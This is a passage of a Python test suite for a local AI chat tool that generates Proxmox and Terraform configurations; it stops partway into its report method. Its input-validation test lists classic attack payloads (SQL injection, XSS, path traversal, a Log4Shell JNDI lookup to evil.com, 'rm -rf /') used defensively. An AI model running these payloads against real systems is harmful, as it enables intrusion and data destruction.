#!/usr/bin/env python3
"""
Comprehensive AI Chat Functionality Validation Framework

Following CLAUDE.md methodology, this comprehensive test suite validates that 
the AI chat functionality fixes are working correctly across all critical dimensions:

1. Functional Testing
2. Integration Testing  
3. End-to-End Workflow Testing
4. Security Validation
5. Performance Testing

This framework provides detailed pass/fail reporting with specific test results.
"""

import asyncio
import sys
import os
import time
import json
import re
import psutil
import subprocess
from pathlib import Path
from typing import Dict, List, Tuple, Any, Optional
from dataclasses import dataclass
from datetime import datetime

# Add project root to Python path
sys.path.insert(0, str(Path(__file__).parent))

@dataclass
class TestResult:
    """Test result data structure."""
    test_name: str
    category: str
    status: str  # PASS, FAIL, SKIP, ERROR
    details: str
    execution_time: float
    metrics: Dict[str, Any]
    issues_found: List[str]

@dataclass
class ValidationReport:
    """Comprehensive validation report."""
    test_results: List[TestResult]
    overall_status: str
    total_tests: int
    passed_tests: int
    failed_tests: int
    execution_time: float
    system_info: Dict[str, Any]
    recommendations: List[str]

class ComprehensiveAIValidator:
    """Comprehensive AI chat functionality validator."""
    
    def __init__(self):
        """Initialize the validation framework."""
        self.results: List[TestResult] = []
        self.start_time = time.time()
        self.system_info = self._collect_system_info()
        
        # Test configuration
        self.test_config = {
            "timeout_short": 10.0,  # For quick tests
            "timeout_medium": 30.0,  # For AI requests
            "timeout_long": 60.0,   # For complex operations
            "memory_threshold_mb": 1000,  # Max memory usage increase
            "response_time_threshold": 15.0,  # Max acceptable response time
        }
        
        print("🔧 Comprehensive AI Chat Functionality Validation")
        print("=" * 70)
        print(f"Target Hardware: Intel N150, 4-core, 7.8GB RAM")
        print(f"Test Start Time: {datetime.now().isoformat()}")
        print("=" * 70)
    
    def _collect_system_info(self) -> Dict[str, Any]:
        """Collect system information for the test report."""
        try:
            return {
                "cpu_count": psutil.cpu_count(),
                "cpu_percent": psutil.cpu_percent(interval=1),
                "memory_total_gb": psutil.virtual_memory().total / (1024**3),
                "memory_available_gb": psutil.virtual_memory().available / (1024**3),
                "memory_percent": psutil.virtual_memory().percent,
                "disk_usage_percent": psutil.disk_usage('/').percent,
                "platform": os.uname().sysname,
                "architecture": os.uname().machine
            }
        except Exception as e:
            return {"error": str(e)}
    
    def _log_test_start(self, test_name: str, category: str):
        """Log test start."""
        print(f"\n🧪 [{category}] {test_name}")
        print("-" * 50)
    
    def _add_result(self, test_name: str, category: str, status: str, 
                    details: str, execution_time: float, 
                    metrics: Dict[str, Any] = None, 
                    issues_found: List[str] = None):
        """Add a test result."""
        result = TestResult(
            test_name=test_name,
            category=category,
            status=status,
            details=details,
            execution_time=execution_time,
            metrics=metrics or {},
            issues_found=issues_found or []
        )
        self.results.append(result)
        
        # Log result
        status_icon = {
            "PASS": "✅",
            "FAIL": "❌", 
            "SKIP": "⏭️",
            "ERROR": "💥"
        }.get(status, "❓")
        
        print(f"   {status_icon} {status}: {details}")
        if metrics:
            for key, value in metrics.items():
                print(f"      • {key}: {value}")
        if issues_found:
            for issue in issues_found:
                print(f"      ⚠️  {issue}")
    
    async def run_functional_tests(self):
        """
        1. FUNCTIONAL TESTING
        Test that the AI now properly responds to infrastructure requests.
        """
        category = "FUNCTIONAL"
        
        # Test 1.1: VM Generation Request
        test_name = "AI Response to VM Generation Request"
        self._log_test_start(test_name, category)
        start_time = time.time()
        
        try:
            from src.proxmox_ai.cli.commands.ai_commands import _generate_chat_response_local
            from src.proxmox_ai.ai.local_ai_client import optimized_ai_client
            
            test_input = "Generate a VM for hosting 5 AI agents for development"
            
            response = await asyncio.wait_for(
                _generate_chat_response_local(
                    ai_client=optimized_ai_client,
                    user_input=test_input,
                    conversation=[],
                    mode="infrastructure", 
                    skill_level="intermediate",
                    context=None
                ),
                timeout=self.test_config["timeout_medium"]
            )
            
            # Analyze response quality
            issues = []
            metrics = {
                "response_length": len(response),
                "contains_terraform": "terraform" in response.lower(),
                "contains_vm_config": any(term in response.lower() for term in ["memory", "cores", "vmid"]),
                "is_generic": any(phrase in response.lower() for phrase in [
                    "tell me more about your goals", 
                    "could you provide more specific details",
                    "what are your requirements"
                ])
            }
            
            # Check for expected technical content
            technical_indicators = [
                "terraform", "resource", "proxmox", "vm", "memory", "cores", 
                "ai-agents", "development", "8192", "configuration"
            ]
            
            technical_score = sum(1 for indicator in technical_indicators 
                                 if indicator in response.lower())
            metrics["technical_content_score"] = f"{technical_score}/{len(technical_indicators)}"
            
            # Validation criteria
            if metrics["is_generic"]:
                issues.append("Response is still generic - core issue not fixed")
            
            if not metrics["contains_terraform"] and not metrics["contains_vm_config"]:
                issues.append("Response lacks concrete infrastructure configuration")
            
            if len(response) < 500:
                issues.append("Response too short for infrastructure guidance")
            
            if technical_score < 5:
                issues.append("Insufficient technical content")
            
            status = "PASS" if not issues else "FAIL"
            details = f"Generated {len(response)} char response with {technical_score}/{len(technical_indicators)} technical indicators"
            
            execution_time = time.time() - start_time
            self._add_result(test_name, category, status, details, execution_time, metrics, issues)
            
        except Exception as e:
            execution_time = time.time() - start_time
            self._add_result(test_name, category, "ERROR", f"Exception: {str(e)}", execution_time)
        
        # Test 1.2: Web Server VM Request
        test_name = "AI Response to Web Server VM Request"
        self._log_test_start(test_name, category)
        start_time = time.time()
        
        try:
            test_input = "Create a web server VM with nginx"
            
            response = await asyncio.wait_for(
                _generate_chat_response_local(
                    ai_client=optimized_ai_client,
                    user_input=test_input,
                    conversation=[],
                    mode="infrastructure",
                    skill_level="intermediate", 
                    context=None
                ),
                timeout=self.test_config["timeout_medium"]
            )
            
            # Check for web server specific content
            web_server_indicators = [
                "nginx", "web server", "http", "port 80", "port 443",
                "ssl", "domain", "virtual host"
            ]
            
            web_server_score = sum(1 for indicator in web_server_indicators
                                  if indicator in response.lower())
            
            metrics = {
                "response_length": len(response),
                "web_server_content_score": f"{web_server_score}/{len(web_server_indicators)}",
                "contains_terraform": "terraform" in response.lower(),
                "contains_nginx": "nginx" in response.lower()
            }
            
            issues = []
            if web_server_score < 2:
                issues.append("Insufficient web server specific content")
            
            if not metrics["contains_nginx"]:
                issues.append("Missing nginx configuration")
            
            status = "PASS" if not issues else "FAIL"
            details = f"Web server response with {web_server_score}/{len(web_server_indicators)} relevant terms"
            
            execution_time = time.time() - start_time
            self._add_result(test_name, category, status, details, execution_time, metrics, issues)
            
        except Exception as e:
            execution_time = time.time() - start_time
            self._add_result(test_name, category, "ERROR", f"Exception: {str(e)}", execution_time)
    
    async def run_integration_tests(self):
        """
        2. INTEGRATION TESTING
        Verify the chat system integrates properly with all components.
        """
        category = "INTEGRATION"
        
        # Test 2.1: Local AI Model Integration
        test_name = "Local AI Model Connection"
        self._log_test_start(test_name, category)
        start_time = time.time()
        
        try:
            from src.proxmox_ai.ai.local_ai_client import optimized_ai_client
            
            is_available = await optimized_ai_client.is_available()
            model_info = optimized_ai_client.get_model_info()
            perf_stats = optimized_ai_client.get_performance_stats()
            
            metrics = {
                "ai_available": is_available,
                "current_model": model_info["current_model"],
                "recommended_model": model_info["recommended_model"],
                "total_requests": perf_stats["total_requests"]
            }
            
            issues = []
            if not is_available:
                issues.append("Local AI model not available - Ollama may not be running")
            
            status = "PASS" if is_available else "SKIP"
            details = f"AI Model: {model_info['current_model']}, Available: {is_available}"
            
            execution_time = time.time() - start_time
            self._add_result(test_name, category, status, details, execution_time, metrics, issues)
            
        except Exception as e:
            execution_time = time.time() - start_time
            self._add_result(test_name, category, "ERROR", f"Exception: {str(e)}", execution_time)
        
        # Test 2.2: Knowledge Base Integration
        test_name = "Knowledge Base Integration"
        self._log_test_start(test_name, category)
        start_time = time.time()
        
        try:
            from src.proxmox_ai.ai.knowledge_base import technical_knowledge_base
            from src.proxmox_ai.ai.system_prompts import TechnicalDomain, ExpertiseLevel
            from src.proxmox_ai.ai.knowledge_base import KnowledgeContext
            
            # Test knowledge base functionality
            context = KnowledgeContext(
                domain=TechnicalDomain.VIRTUALIZATION,
                expertise_level=ExpertiseLevel.INTERMEDIATE,
                specific_technologies=["proxmox", "terraform"],
                use_case="vm_creation",
                security_requirements="medium",
                compliance_needs=[]
            )
            
            domain_knowledge = technical_knowledge_base.get_domain_knowledge(context)
            security_recs = technical_knowledge_base.get_security_recommendations(
                TechnicalDomain.VIRTUALIZATION, ["proxmox"]
            )
            
            metrics = {
                "domain_knowledge_topics": len(domain_knowledge) if domain_knowledge else 0,
                "security_recommendations": len(security_recs),
                "knowledge_base_functional": bool(domain_knowledge)
            }
            
            issues = []
            if not domain_knowledge:
                issues.append("Knowledge base not returning domain knowledge")
            
            if not security_recs:
                issues.append("Security recommendations not available")
            
            status = "PASS" if domain_knowledge and security_recs else "FAIL"
            details = f"Knowledge base with {len(domain_knowledge or {})} topics, {len(security_recs)} security recs"
            
            execution_time = time.time() - start_time
            self._add_result(test_name, category, status, details, execution_time, metrics, issues)
            
        except Exception as e:
            execution_time = time.time() - start_time
            self._add_result(test_name, category, "ERROR", f"Exception: {str(e)}", execution_time)
        
        # Test 2.3: NLP Processor Integration
        test_name = "NLP Processor Integration"
        self._log_test_start(test_name, category)
        start_time = time.time()
        
        try:
            from src.proxmox_ai.ai.natural_language_processor import nlp_processor
            
            test_inputs = [
                "Generate a VM for hosting 5 AI agents",
                "Create terraform configuration for web server",
                "Deploy ansible playbook for database cluster"
            ]
            
            parsed_results = []
            for test_input in test_inputs:
                parsed = nlp_processor.parse_user_input(test_input)
                parsed_results.append({
                    "input": test_input,
                    "intent": parsed.intent_type.value if parsed.intent_type else None,
                    "confidence": parsed.confidence,
                    "infrastructure_type": parsed.infrastructure_type.value if parsed.infrastructure_type else None
                })
            
            metrics = {
                "inputs_processed": len(parsed_results),
                "avg_confidence": sum(r["confidence"] for r in parsed_results) / len(parsed_results),
                "intents_detected": sum(1 for r in parsed_results if r["intent"]),
                "infrastructure_types_detected": sum(1 for r in parsed_results if r["infrastructure_type"])
            }
            
            issues = []
            if metrics["avg_confidence"] < 0.7:
                issues.append("Low average confidence in intent parsing")
            
            if metrics["intents_detected"] < len(test_inputs) * 0.8:
                issues.append("NLP not detecting most intents")
            
            status = "PASS" if not issues else "FAIL"
            details = f"Processed {len(parsed_results)} inputs, avg confidence: {metrics['avg_confidence']:.1%}"
            
            execution_time = time.time() - start_time
            self._add_result(test_name, category, status, details, execution_time, metrics, issues)
            
        except Exception as e:
            execution_time = time.time() - start_time
            self._add_result(test_name, category, "ERROR", f"Exception: {str(e)}", execution_time)
        
        # Test 2.4: Hardware Optimization Integration
        test_name = "Hardware Optimization Integration"
        self._log_test_start(test_name, category)
        start_time = time.time()
        
        try:
            from src.proxmox_ai.core.hardware_detector import hardware_detector
            from src.proxmox_ai.ai.local_ai_client import skill_manager
            
            hardware_specs = hardware_detector.specs
            performance_profile = hardware_detector.get_performance_profile()
            optimal_model = hardware_detector.get_optimal_model_config()
            optimal_skill = skill_manager.get_optimal_skill_level("intermediate")
            
            metrics = {
                "cpu_cores": hardware_specs.cpu_cores,
                "total_memory_gb": hardware_specs.total_memory_gb,
                "available_memory_gb": hardware_specs.available_memory_gb,
                "gpu_available": hardware_specs.gpu_available,
                "performance_tier": performance_profile["model_quality"],
                "optimal_model": optimal_model.model_name,
                "optimal_skill_level": optimal_skill
            }
            
            issues = []
            if hardware_specs.cpu_cores < 4:
                issues.append(f"Detected only {hardware_specs.cpu_cores} cores, expected 4+ for target hardware")
            
            if hardware_specs.total_memory_gb < 7.0:
                issues.append(f"Detected only {hardware_specs.total_memory_gb:.1f}GB RAM, expected 7.8GB+")
            
            if performance_profile["model_quality"] == "Basic" and optimal_skill != "beginner":
                issues.append("Hardware optimization not adjusting skill level appropriately")
            
            status = "PASS" if not issues else "FAIL"
            details = f"Hardware: {hardware_specs.cpu_cores}C/{hardware_specs.total_memory_gb:.1f}GB, {performance_profile['model_quality']} tier"
            
            execution_time = time.time() - start_time
            self._add_result(test_name, category, status, details, execution_time, metrics, issues)
            
        except Exception as e:
            execution_time = time.time() - start_time
            self._add_result(test_name, category, "ERROR", f"Exception: {str(e)}", execution_time)
    
    async def run_end_to_end_tests(self):
        """
        3. END-TO-END WORKFLOW TESTING
        Test complete user workflow from chat to infrastructure deployment.
        """
        category = "END_TO_END"
        
        # Test 3.1: Complete VM Creation Workflow
        test_name = "Complete VM Creation Workflow"
        self._log_test_start(test_name, category)
        start_time = time.time()
        
        try:
            from src.proxmox_ai.cli.commands.ai_commands import _generate_chat_response_local, _check_and_offer_deployment
            from src.proxmox_ai.ai.local_ai_client import optimized_ai_client
            
            # Step 1: User makes infrastructure request
            user_request = "Generate a VM for hosting 5 AI agents for development"
            
            # Step 2: AI processes and generates response
            ai_response = await asyncio.wait_for(
                _generate_chat_response_local(
                    ai_client=optimized_ai_client,
                    user_input=user_request,
                    conversation=[],
                    mode="infrastructure",
                    skill_level="intermediate",
                    context=None
                ),
                timeout=self.test_config["timeout_medium"]
            )
            
            # Step 3: Check if deployment workflow is triggered
            workflow_steps = []
            
            # Analyze if response contains deployable infrastructure code
            has_terraform = "terraform" in ai_response.lower() and "resource" in ai_response.lower()
            has_vm_config = any(term in ai_response.lower() for term in ["vmid", "memory", "cores"])
            has_deployment_guidance = any(term in ai_response.lower() for term in [
                "terraform init", "terraform apply", "deployment", "next steps"
            ])
            
            workflow_steps.append(f"User request processed: {len(user_request)} chars")
            workflow_steps.append(f"AI response generated: {len(ai_response)} chars")
            workflow_steps.append(f"Infrastructure code detected: {has_terraform or has_vm_config}")
            workflow_steps.append(f"Deployment guidance provided: {has_deployment_guidance}")
            
            metrics = {
                "request_length": len(user_request),
                "response_length": len(ai_response),
                "has_terraform_code": has_terraform,
                "has_vm_config": has_vm_config,
                "has_deployment_guidance": has_deployment_guidance,
                "workflow_complete": has_terraform and has_deployment_guidance
            }
            
            issues = []
            if not (has_terraform or has_vm_config):
                issues.append("No infrastructure code generated in response")
            
            if not has_deployment_guidance:
                issues.append("No deployment guidance provided")
            
            status = "PASS" if metrics["workflow_complete"] else "FAIL"
            details = f"Workflow: Request→Response→Infrastructure→Guidance = {metrics['workflow_complete']}"
            
            execution_time = time.time() - start_time
            self._add_result(test_name, category, status, details, execution_time, metrics, issues)
            
        except Exception as e:
            execution_time = time.time() - start_time
            self._add_result(test_name, category, "ERROR", f"Exception: {str(e)}", execution_time)
        
        # Test 3.2: Code Generation and File Handling
        test_name = "Code Generation and File Handling"
        self._log_test_start(test_name, category)
        start_time = time.time()
        
        try:
            from src.proxmox_ai.cli.commands.ai_commands import _extract_code_from_response
            
            # Test code extraction functionality
            sample_response = '''Here's a Terraform configuration for your VM:

```hcl
resource "proxmox_vm_qemu" "ai_development_vm" {
  name    = "ai-agents-dev"
  memory  = 8192
  cores   = 4
}
```

Deploy with: terraform init && terraform apply'''
            
            extracted_code = _extract_code_from_response(sample_response, "hcl")
            
            metrics = {
                "code_extraction_working": bool(extracted_code),
                "extracted_code_length": len(extracted_code) if extracted_code else 0,
                "contains_resource": "resource" in (extracted_code or ""),
                "contains_vm_config": "ai-agents-dev" in (extracted_code or "")
            }
            
            issues = []
            if not extracted_code:
                issues.append("Code extraction not working")
            
            if extracted_code and not metrics["contains_resource"]:
                issues.append("Extracted code missing expected content")
            
            status = "PASS" if extracted_code and metrics["contains_resource"] else "FAIL"
            details = f"Code extraction: {bool(extracted_code)}, Length: {len(extracted_code) if extracted_code else 0}"
            
            execution_time = time.time() - start_time
            self._add_result(test_name, category, status, details, execution_time, metrics, issues)
            
        except Exception as e:
            execution_time = time.time() - start_time
            self._add_result(test_name, category, "ERROR", f"Exception: {str(e)}", execution_time)
    
    async def run_security_tests(self):
        """
        4. SECURITY VALIDATION
        Ensure the fixes maintain security standards.
        """
        category = "SECURITY"
        
        # Test 4.1: No Hardcoded Credentials
        test_name = "No Hardcoded Credentials in Generated Code"
        self._log_test_start(test_name, category)
        start_time = time.time()
        
        try:
            from src.proxmox_ai.cli.commands.ai_commands import _fallback_infrastructure_response
            from src.proxmox_ai.ai.local_ai_client import optimized_ai_client
            
            # Generate infrastructure code and check for hardcoded credentials
            response = await _fallback_infrastructure_response(
                ai_client=optimized_ai_client,
                user_input="Create a VM with database access",
                skill_level="intermediate",
                mode="infrastructure"
            )
            
            # Check for common credential patterns
            credential_patterns = [
                r'password\s*=\s*"[^"]*"',
                r'api_key\s*=\s*"[^"]*"',
                r'secret\s*=\s*"[^"]*"',
                r'token\s*=\s*"[^"]*"',
                r'pm_password\s*=\s*"[^"]*"'  # Proxmox specific
            ]
            
            credentials_found = []
            for pattern in credential_patterns:
                matches = re.findall(pattern, response, re.IGNORECASE)
                if matches:
                    credentials_found.extend(matches)
            
            # Look for hardcoded IPs (should use variables)
            hardcoded_ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', response)
            
            # Check for secure practices
            uses_variables = "var." in response
            uses_sensitive = "sensitive" in response
            
            metrics = {
                "credentials_found": len(credentials_found),
                "hardcoded_ips_found": len(hardcoded_ips),
                "uses_variables": uses_variables,
                "uses_sensitive_flag": uses_sensitive,
                "response_length": len(response)
            }
            
            issues = []
            if credentials_found:
                issues.append(f"Found {len(credentials_found)} potential hardcoded credentials")
            
            if len(hardcoded_ips) > 2:  # Some IPs for examples are OK
                issues.append(f"Found {len(hardcoded_ips)} hardcoded IP addresses")
            
            if not uses_variables:
                issues.append("Generated code doesn't use variables for configuration")
            
            status = "PASS" if not credentials_found else "FAIL"
            details = f"Security check: {len(credentials_found)} credentials, {len(hardcoded_ips)} IPs, uses vars: {uses_variables}"
            
            execution_time = time.time() - start_time
            self._add_result(test_name, category, status, details, execution_time, metrics, issues)
            
        except Exception as e:
            execution_time = time.time() - start_time
            self._add_result(test_name, category, "ERROR", f"Exception: {str(e)}", execution_time)
        
        # Test 4.2: Input Validation and Sanitization
        test_name = "Input Validation and Sanitization"
        self._log_test_start(test_name, category)
        start_time = time.time()
        
        try:
            from src.proxmox_ai.cli.commands.ai_commands import _generate_chat_response_local
            from src.proxmox_ai.ai.local_ai_client import optimized_ai_client
            
            # Test malicious inputs
            malicious_inputs = [
                "'; DROP TABLE users; --",
                "<script>alert('xss')</script>",
                "../../etc/passwd",
                "${jndi:ldap://evil.com/a}",
                "rm -rf /"
            ]
            
            safe_responses = 0
            total_tests = len(malicious_inputs)
            
            for malicious_input in malicious_inputs:
                try:
                    response = await asyncio.wait_for(
                        _generate_chat_response_local(
                            ai_client=optimized_ai_client,
                            user_input=malicious_input,
                            conversation=[],
                            mode="infrastructure",
                            skill_level="intermediate", 
                            context=None
                        ),
                        timeout=self.test_config["timeout_short"]
                    )
                    
                    # Check if the malicious input is reflected in the response
                    if malicious_input.lower() not in response.lower():
                        safe_responses += 1
                    
                except Exception:
                    # Exceptions on malicious input can be considered safe
                    safe_responses += 1
            
            metrics = {
                "total_malicious_tests": total_tests,
                "safe_responses": safe_responses,
                "safety_rate": safe_responses / total_tests if total_tests > 0 else 0
            }
            
            issues = []
            if metrics["safety_rate"] < 0.8:
                issues.append("Input validation may be insufficient")
            
            status = "PASS" if metrics["safety_rate"] >= 0.8 else "FAIL"
            details = f"Input safety: {safe_responses}/{total_tests} ({metrics['safety_rate']:.1%})"
            
            execution_time = time.time() - start_time
            self._add_result(test_name, category, status, details, execution_time, metrics, issues)
            
        except Exception as e:
            execution_time = time.time() - start_time
            self._add_result(test_name, category, "ERROR", f"Exception: {str(e)}", execution_time)
        
        # Test 4.3: Secure Proxmox API Handling
        test_name = "Secure Proxmox API Handling"
        self._log_test_start(test_name, category)
        start_time = time.time()
        
        try:
            # Check Proxmox client security configuration
            import inspect
            from src.proxmox_ai.api.proxmox_client import get_proxmox_client
            
            # Analyze source code for security practices
            source = inspect.getsource(get_proxmox_client)
            
            security_checks = {
                "uses_tls": "tls" in source.lower() or "ssl" in source.lower(),
                "has_timeout": "timeout" in source.lower(),
                "validates_certs": "verify" in source.lower() or "cert" in source.lower(),
                "uses_auth": "auth" in source.lower() or "token" in source.lower()
            }
            
            metrics = {
                **security_checks,
                "security_score": sum(security_checks.values()) / len(security_checks)
            }
            
            issues = []
            if not security_checks["uses_tls"]:
                issues.append("TLS/SSL not explicitly configured")
            
            if not security_checks["has_timeout"]:
                issues.append("API timeouts not configured")
            
            status = "PASS" if metrics["security_score"] >= 0.75 else "FAIL"
            details = f"Proxmox API security: {metrics['security_score']:.1%} ({sum(security_checks.values())}/{len(security_checks)})"
            
            execution_time = time.time() - start_time
            self._add_result(test_name, category, status, details, execution_time, metrics, issues)
            
        except Exception as e:
            execution_time = time.time() - start_time
            self._add_result(test_name, category, "ERROR", f"Exception: {str(e)}", execution_time)
        
        # Test 4.4: Local Processing Security
        test_name = "Local Processing Security"
        self._log_test_start(test_name, category)
        start_time = time.time()
        
        try:
            from src.proxmox_ai.ai.local_ai_client import optimized_ai_client
            
            # Check that AI client is configured for local processing
            model_info = optimized_ai_client.get_model_info()
            host = optimized_ai_client.ollama_host
            
            is_local = "localhost" in host or "127.0.0.1" in host
            uses_local_model = "llama" in model_info["current_model"].lower()
            
            metrics = {
                "ai_host": host,
                "current_model": model_info["current_model"],
                "is_local_host": is_local,
                "uses_local_model": uses_local_model,
                "local_processing": is_local and uses_local_model
            }
            
            issues = []
            if not is_local:
                issues.append("AI client not configured for local processing")
            
            if not uses_local_model:
                issues.append("Not using local AI model")
            
            status = "PASS" if metrics["local_processing"] else "FAIL"
            details = f"Local processing: {is_local}, Local model: {uses_local_model}"
            
            execution_time = time.time() - start_time
            self._add_result(test_name, category, status, details, execution_time, metrics, issues)
            
        except Exception as e:
            execution_time = time.time() - start_time
            self._add_result(test_name, category, "ERROR", f"Exception: {str(e)}", execution_time)
    
    async def run_performance_tests(self):
        """
        5. PERFORMANCE TESTING
        Verify the fixes work well on Intel N150, 4-core, 7.8GB RAM.
        """
        category = "PERFORMANCE"
        
        # Test 5.1: Response Time Performance
        test_name = "Response Time Performance"
        self._log_test_start(test_name, category)
        start_time = time.time()
        
        try:
            from src.proxmox_ai.cli.commands.ai_commands import _generate_chat_response_local
            from src.proxmox_ai.ai.local_ai_client import optimized_ai_client
            
            # Test multiple requests to get average performance
            test_requests = [
                "Generate a VM for hosting 5 AI agents for development",
                "Create a web server VM with nginx", 
                "Deploy a database cluster with high availability"
            ]
            
            response_times = []
            memory_usage_before = psutil.virtual_memory().percent
            
            for request in test_requests:
                request_start = time.time()
                
                try:
                    response = await asyncio.wait_for(
                        _generate_chat_response_local(
                            ai_client=optimized_ai_client,
                            user_input=request,
                            conversation=[],
                            mode="infrastructure",
                            skill_level="intermediate",
                            context=None
                        ),
                        timeout=self.test_config["timeout_medium"]
                    )
                    
                    request_time = time.time() - request_start
                    response_times.append(request_time)
                    
                except asyncio.TimeoutError:
                    response_times.append(self.test_config["timeout_medium"])
            
            memory_usage_after = psutil.virtual_memory().percent
            memory_increase = memory_usage_after - memory_usage_before
            
            avg_response_time = sum(response_times) / len(response_times)
            max_response_time = max(response_times)
            
            metrics = {
                "avg_response_time": f"{avg_response_time:.2f}s",
                "max_response_time": f"{max_response_time:.2f}s", 
                "requests_tested": len(test_requests),
                "timeouts": sum(1 for t in response_times if t >= self.test_config["timeout_medium"]),
                "memory_increase_percent": f"{memory_increase:.1f}%"
            }
            
            issues = []
            if avg_response_time > self.test_config["response_time_threshold"]:
                issues.append(f"Average response time {avg_response_time:.1f}s exceeds {self.test_config['response_time_threshold']}s threshold")
            
            if metrics["timeouts"] > 0:
                issues.append(f"{metrics['timeouts']} requests timed out")
            
            if memory_increase > 10:
                issues.append(f"High memory increase: {memory_increase:.1f}%")
            
            status = "PASS" if not issues else "FAIL"
            details = f"Avg: {avg_response_time:.1f}s, Max: {max_response_time:.1f}s, Timeouts: {metrics['timeouts']}"
            
            execution_time = time.time() - start_time
            self._add_result(test_name, category, status, details, execution_time, metrics, issues)
            
        except Exception as e:
            execution_time = time.time() - start_time
            self._add_result(test_name, category, "ERROR", f"Exception: {str(e)}", execution_time)
        
        # Test 5.2: Memory Usage Testing
        test_name = "Memory Usage Testing"
        self._log_test_start(test_name, category)
        start_time = time.time()
        
        try:
            from src.proxmox_ai.ai.local_ai_client import optimized_ai_client
            
            # Monitor memory usage during AI operations
            memory_before = psutil.virtual_memory()
            process = psutil.Process()
            process_memory_before = process.memory_info().rss / 1024 / 1024  # MB
            
            # Perform memory-intensive operations
            if await optimized_ai_client.is_available():
                # Warm up model
                await optimized_ai_client.warmup_model()
                
                # Clear cache and test memory efficiency
                optimized_ai_client.clear_cache()
                
                # Generate multiple responses
                for i in range(3):
                    await asyncio.wait_for(
                        optimized_ai_client.generate_terraform_config(
                            f"Create VM configuration {i}",
                            "intermediate"
                        ),
                        timeout=self.test_config["timeout_short"]
                    )
            
            memory_after = psutil.virtual_memory()
            process_memory_after = process.memory_info().rss / 1024 / 1024  # MB
            
            memory_diff_mb = (memory_after.used - memory_before.used) / 1024 / 1024
            process_memory_diff = process_memory_after - process_memory_before
            
            metrics = {
                "system_memory_increase_mb": f"{memory_diff_mb:.1f}MB",
                "process_memory_increase_mb": f"{process_memory_diff:.1f}MB",
                "total_memory_gb": f"{memory_after.total / 1024 / 1024 / 1024:.1f}GB",
                "available_memory_gb": f"{memory_after.available / 1024 / 1024 / 1024:.1f}GB",
                "memory_usage_percent": f"{memory_after.percent:.1f}%"
            }
            
            issues = []
            if memory_diff_mb > self.test_config["memory_threshold_mb"]:
                issues.append(f"High system memory increase: {memory_diff_mb:.1f}MB")
            
            if process_memory_diff > 500:  # 500MB threshold for process
                issues.append(f"High process memory increase: {process_memory_diff:.1f}MB")
            
            if memory_after.percent > 90:
                issues.append(f"High overall memory usage: {memory_after.percent:.1f}%")
            
            status = "PASS" if not issues else "FAIL"
            details = f"Memory: +{memory_diff_mb:.1f}MB system, +{process_memory_diff:.1f}MB process"
            
            execution_time = time.time() - start_time
            self._add_result(test_name, category, status, details, execution_time, metrics, issues)
            
        except Exception as e:
            execution_time = time.time() - start_time
            self._add_result(test_name, category, "ERROR", f"Exception: {str(e)}", execution_time)
        
        # Test 5.3: Hardware Optimization Testing
        test_name = "Hardware Optimization Testing"
        self._log_test_start(test_name, category)
        start_time = time.time()
        
        try:
            from src.proxmox_ai.core.hardware_detector import hardware_detector
            from src.proxmox_ai.ai.local_ai_client import optimized_ai_client
            
            # Test hardware detection and optimization
            specs = hardware_detector.specs
            performance_profile = hardware_detector.get_performance_profile()
            optimal_config = hardware_detector.get_optimal_model_config()
            runtime_config = hardware_detector.get_runtime_config()
            
            # Test if configurations are appropriate for Intel N150
            is_optimized_for_low_power = (
                runtime_config["timeout"] <= 30 and
                runtime_config["max_context_length"] <= 4096 and
                performance_profile["model_quality"] in ["Basic", "Medium"]
            )
            
            # Test AI client configuration
            ai_config = optimized_ai_client.get_model_info()
            
            metrics = {
                "detected_cpu_cores": specs.cpu_cores,
                "detected_memory_gb": f"{specs.total_memory_gb:.1f}GB",
                "performance_tier": performance_profile["model_quality"],
                "optimal_model": optimal_config.model_name,
                "timeout_optimized": runtime_config["timeout"] <= 30,
                "context_length_optimized": runtime_config["max_context_length"] <= 4096,
                "is_hardware_optimized": is_optimized_for_low_power
            }
            
            issues = []
            if not is_optimized_for_low_power:
                issues.append("Configuration not optimized for low-power hardware")
            
            if specs.cpu_cores < 4:
                issues.append(f"Only {specs.cpu_cores} CPU cores detected, expected 4+")
            
            if specs.total_memory_gb < 7.0:
                issues.append(f"Only {specs.total_memory_gb:.1f}GB RAM detected, expected 7.8GB+")
            
            status = "PASS" if is_optimized_for_low_power else "FAIL"
            details = f"Hardware optimization: {is_optimized_for_low_power}, {performance_profile['model_quality']} tier"
            
            execution_time = time.time() - start_time
            self._add_result(test_name, category, status, details, execution_time, metrics, issues)
            
        except Exception as e:
            execution_time = time.time() - start_time
            self._add_result(test_name, category, "ERROR", f"Exception: {str(e)}", execution_time)
        
        # Test 5.4: Timeout Handling and Graceful Fallbacks
        test_name = "Timeout Handling and Graceful Fallbacks"
        self._log_test_start(test_name, category)
        start_time = time.time()
        
        try:
            from src.proxmox_ai.cli.commands.ai_commands import _fallback_infrastructure_response
            from src.proxmox_ai.ai.local_ai_client import optimized_ai_client
            
            # Test fallback mechanism with simulated timeout
            test_input = "Generate complex multi-tier infrastructure with load balancers"
            
            # Test fallback response (which should always work)
            fallback_response = await _fallback_infrastructure_response(
                ai_client=optimized_ai_client,
                user_input=test_input,
                skill_level="intermediate",
                mode="infrastructure"
            )
            
            # Check if fallback provides useful content
            has_terraform_template = "terraform" in fallback_response.lower()
            has_vm_config = any(term in fallback_response.lower() for term in ["memory", "cores", "vmid"])
            has_instructions = any(term in fallback_response.lower() for term in ["init", "apply", "deploy"])
            
            metrics = {
                "fallback_response_length": len(fallback_response),
                "has_terraform_template": has_terraform_template,
                "has_vm_config": has_vm_config,
                "has_deployment_instructions": has_instructions,
                "fallback_functional": has_terraform_template or has_vm_config
            }
            
            issues = []
            if not metrics["fallback_functional"]:
                issues.append("Fallback response not providing useful infrastructure content")
            
            if len(fallback_response) < 1000:
                issues.append("Fallback response too short for comprehensive guidance")
            
            status = "PASS" if metrics["fallback_functional"] and not issues else "FAIL"
            details = f"Fallback: {len(fallback_response)} chars, Templates: {has_terraform_template}, Instructions: {has_instructions}"
            
            execution_time = time.time() - start_time
            self._add_result(test_name, category, status, details, execution_time, metrics, issues)
            
        except Exception as e:
            execution_time = time.time() - start_time
            self._add_result(test_name, category, "ERROR", f"Exception: {str(e)}", execution_time)
    
    def generate_report(self) -> ValidationReport:
        """Generate comprehensive validation report."""
        total_execution_time = time.time() - self.start_time
        
        # Calculate overall statistics
        total_tests = len(self.results)
        passed_tests = sum(1 for r in self.results if r.status == "PASS")
        failed_tests = sum(1 for r in self.results if r.status == "FAIL")
        error_tests = sum(1 for r in self.results if r.status == "ERROR")
